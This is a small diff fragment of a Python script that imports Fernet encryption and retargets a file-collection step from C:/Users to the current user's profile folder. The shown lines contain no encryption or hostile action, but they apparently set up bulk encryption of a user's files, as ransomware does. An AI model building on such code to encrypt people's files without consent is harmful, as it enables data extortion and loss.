@@ -1,7 +1,7 @@
 import os
 import scandir
 from cryptography.fernet import Fernet
-folder = "C:/Users"
+folder = os.path.expandvars("%userprofile%")
 
 file_list = []
 
